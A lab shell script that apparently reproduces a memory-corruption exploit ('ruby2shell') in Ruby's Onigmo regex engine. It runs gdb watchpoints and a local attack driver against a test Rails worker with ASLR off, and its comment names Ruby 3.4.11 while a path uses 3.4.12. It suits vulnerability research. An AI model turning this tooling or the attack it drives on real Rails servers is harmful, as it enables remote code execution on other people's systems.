#!/bin/sh
# gdb-watch repeat_stk[-32767] across two full repeat-ID attacks on one
# keep-alive stock Rails worker. Labeled conditions: 3.4.11 plain, threads=2,
# shallow layout, ASLR off, regexp timeout disabled for gdb timing only.
# Evidence is gitignored under lab/build/evidence/w301-*.
set -eu
cd "$(dirname "$0")/../.."
export RUBY2SHELL_ONIGMO_GEM_PATH=lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0
export RUBY2SHELL_ONIGMO_LAYOUT=shallow
export RUBY2SHELL_ONIGMO_ASLR_OFF=1
export RAILS_MAX_THREADS=2
export RUBY2SHELL_ONIGMO_SECOND=1
export RUBY2SHELL_ONIGMO_SECOND_REFLECT=1
export RUBY2SHELL_ONIGMO_SECOND_UNITS=32767
export RUBY2SHELL_ONIGMO_GDB_RUBY=lab/build/plain/ruby-3.4.11-plain/bin/ruby
export RUBY2SHELL_ONIGMO_RUBY=lab/repro/ruby2shell-onigmo-gdbwrap.sh
export RUBY2SHELL_ONIGMO_GDB_SCRIPT=lab/repro/ruby2shell-onigmo-watch.gdb
export RUBY2SHELL_ONIGMO_NOTIMEOUT_RB="$PWD/lab/repro/ruby2shell-onigmo-notimeout.rb"
export RUBY2SHELL_ONIGMO_TIMEOUT=120
EV=lab/build/evidence
mkdir -p "$EV"

for i in 1 2 3; do
  tag=w301-mark$i
  port=$((4910 + i))
  rm -f "$EV/$tag.second.sent"
  export RUBY2SHELL_ONIGMO_SECOND_MARKER="$PWD/$EV/$tag.second.sent"
  env RUBY2SHELL_ONIGMO_PORT="$port" \
    python3 lab/repro/ruby2shell-onigmo-repeat-wire.py attack "$tag" || true
  python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(sys.argv[1], "ready", d.get("ready"), "first", d.get("http_status"), d.get("response_bytes"), "second", d.get("second_http_status"), d.get("second_response_bytes"), "health", d.get("health"), "exit", d.get("exit_after_request"), "err", d.get("request_error"))' "$EV/$tag.json"
  grep -E 'ONIG_(ARM|SECOND_MARK|BEFORE|AFTER)|^0x555' "$EV/$tag.server.log" | head -30 || true
done
